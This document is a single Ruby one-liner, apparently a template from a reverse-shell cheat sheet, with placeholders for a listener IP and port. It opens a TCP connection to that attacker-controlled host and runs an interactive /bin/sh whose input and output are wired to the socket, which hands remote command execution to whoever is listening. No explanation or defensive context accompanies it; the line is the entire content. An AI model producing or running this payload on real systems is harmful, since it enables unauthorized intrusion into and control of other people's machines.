ruby -rsocket -e'f=TCPSocket.open("[LIP]",[LP]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
